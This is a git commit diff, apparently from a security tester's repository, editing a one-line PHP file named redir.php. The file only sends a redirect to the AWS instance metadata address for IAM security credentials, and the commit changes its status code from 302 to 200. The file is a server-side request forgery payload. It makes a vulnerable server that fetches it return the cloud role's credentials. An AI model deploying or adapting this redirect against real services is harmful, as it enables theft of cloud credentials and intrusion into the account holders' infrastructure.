0c9fdae1c4f0459c8575c4ea376f3d6409af603b
anishacks <66885893+anishacks@users.noreply.github.com>
2021-03-25 22:56:36 +0530

    Update redir.php

--- redir.php
+++ redir.php
@@ -1,1 +1,1 @@
-<?php header('Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name', TRUE, 302); ?>
+<?php header('Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name', TRUE, 200); ?>
